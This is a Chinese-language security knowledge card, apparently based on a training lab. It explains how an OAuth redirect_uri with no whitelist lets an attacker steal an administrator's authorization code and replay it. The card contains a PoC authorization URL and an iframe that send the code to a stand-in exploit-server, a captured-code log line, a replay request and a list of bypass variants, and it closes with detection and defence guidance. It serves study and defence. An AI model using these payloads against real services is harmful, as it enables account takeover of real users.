---
id: web-generic-oauth-arbitrary-redirect-uri-code-theft
title: OAuth redirect_uri 未做白名单校验：把管理员授权码重定向到攻击者服务器并重放登录（账户接管）
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-arbitrary-redirect-uri-authorization-code-theft
aliases:
- OAuth redirect_uri 任意
- 授权码窃取
- OAuth code 重放
- redirect_uri 账户接管
- authorization code replay
tags:
- web
- oauth
- redirect-uri
- authorization-code
- account-takeover
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V281
  verified_at: '2026-11-08T05:07:34+08:00'
  notes: '已对照原文 Lab: OAuth account hijacking via redirect_uri 与图36-44核对：/auth 的 redirect_uri 可改为攻击者 exploit-server（图37/38），受害者 iframe 触发后 code 出现在攻击者日志（图39 call_3b63 的 /?code=...），用该 code 访问合法 /oauth-callback 成功登录（图42），admin 权限删除 carlos（图34/44）。卡内任意 redirect_uri+code 重放链路与原文一致。未设 affected_versions（原文未给版本）。未执行靶场。'
---

## 一句话结论

OAuth 服务的 `redirect_uri` 允许任意值（未做注册白名单精确匹配），攻击者把授权链接的 `redirect_uri` 指向自己的服务器并让管理员访问；管理员浏览器带着 OAuth 会话完成授权后，授权码被 302 送到攻击者服务器，攻击者再拿该 code 访问合法回调 `/oauth-callback?code=...` 换取会话，即可登录管理员账户。

## 原理

- 授权码流程中，OAuth 服务在用户同意后把 `code` 通过 302 附加到 `redirect_uri` 返回。若 `redirect_uri` 不校验，攻击者可把它设为自己的域名，code 就直接送到攻击者手里。
- 授权码本身是"代表某个用户在某个 client 下的授权"的短期凭证；如果服务端兑换 code 时只校验 code + client，不校验兑换者与发起授权时的浏览器/会话绑定（没有 PKCE、state 或 sender-constrained 机制），攻击者可以在自己的浏览器里重放该 code，完成兑换并得到管理员会话。
- 本例中管理员已登录 OAuth 服务且会访问攻击者提供的 iframe；iframe 加载 `/auth?client_id=...&redirect_uri=https://attacker/&response_type=code&scope=openid profile email`，OAuth 服务自动同意（或管理员已有会话），随后 302 到攻击者服务器并携带 `code`。
- 攻击者不需要知道管理员密码：code 就是一次性的身份凭证，重放即完成登录。

## 触发条件

- OAuth 服务的 `redirect_uri` 未做精确白名单校验（任意域名、任意路径均可）。
- 使用授权码流程，且 code 兑换不绑定发起授权的浏览器/会话（无 PKCE/state/sender constraint）。
- 管理员或受害者会访问攻击者可控的页面（本例为 exploit server 的 iframe），且其 OAuth 会话处于登录状态。
- 攻击者能接收并读取自己服务器上的请求（访问日志/回显）。

## 利用步骤

1. 登录自己的账号走一遍 OAuth，抓取 `/auth?client_id=...&redirect_uri=...&response_type=code&scope=...` 请求，确认 `client_id` 与 `scope`。
2. 把 `redirect_uri` 改为攻击者服务器地址（如 `https://exploit-server/`），构造授权 URL。
3. 在 exploit server 放置 `<iframe src="<授权URL>">`，点击 Deliver exploit to victim；管理员浏览器加载 iframe 后，OAuth 服务返回 302 到攻击者服务器，URL 带 `?code=...`。
4. 在攻击者服务器访问日志中读取 code。
5. 在自己的浏览器访问目标站点的合法回调：`https://target/oauth-callback?code=<code>`；客户端用 code 换取 token 并建立会话。
6. 确认登录为管理员（如 `/my-account` 显示 administrator），执行管理操作（本例删除 carlos）。

## PoC

构造授权 URL：

```text
https://oauth-server/auth?client_id=<CLIENT_ID>&redirect_uri=https://exploit-server/&response_type=code&scope=openid%20profile%20email
```

投递页面：

```html
<iframe src="https://oauth-server/auth?client_id=<CLIENT_ID>&redirect_uri=https://exploit-server/&response_type=code&scope=openid%20profile%20email"></iframe>
```

攻击者服务器日志（受害者访问后）：

```text
GET /?code=xzTu8iKgp5RqgImAtklw_neecFK5IBdGtP6gZli-Me HTTP/1.1
```

重放 code：

```http
GET /oauth-callback?code=xzTu8iKgp5RqgImAtklw_neecFK5IBdGtP6gZli-Me HTTP/1.1
Host: target
```

## 变体与关联

- 变体：`redirect_uri` 不是完全任意，而是只校验前缀/域名后缀/包含关系；可尝试子域名、`@`、路径穿越、`//`、编码、大小写、追加 `?`/`#` 等绕过（相关手法见现有 redirect_uri 前缀绕过卡）。
- 变体：`response_type=token` 时 token 在 fragment 中，攻击者服务器收不到 fragment，需要页面 JS 读取 `location.hash` 再外带（见开放重定向/postMessage 窃取卡）。
- 变体：code 若一次性且短时效，需要在管理员触发后尽快重放；自动化投递+读取日志可解决。
- 关联：[[web-generic-oauth-missing-state-account-link-csrf-takeover]]（缺失 state 导致绑定 CSRF）。
- 关联：[[web-generic-oauth-postmessage-code-theft-sso-bind-xxe]]（redirect_uri 前缀校验 + postMessage 窃取 code）。
- 关联：[[web-generic-oauth-token-theft-open-redirect-fragment]]（redirect_uri 路径穿越 + 开放重定向窃取 token）。

## 检测与防御

- 修复：`redirect_uri` 必须与注册值精确匹配（协议、主机、端口、路径），禁止通配/前缀/包含匹配；不允许相对路径。
- 修复：使用授权码 + PKCE（S256），code 兑换时校验 `code_verifier`；绑定 code 与 client、redirect_uri、用户会话，短时效且一次性。
- 加固：OAuth 授权前对已登录用户做二次确认/展示 client 信息；对 `redirect_uri` 指向外部域名时告警。
- 检测：授权日志中 `redirect_uri` 指向非注册域名/新域名；同一 code 在不同 IP/会话被兑换；管理员会话出现来自攻击者 IP 的登录。
- 检测：监控 OAuth 服务的 302 Location 中出现外部域名；对 exploit/OAST 域名出现在 redirect_uri 的行为做规则。
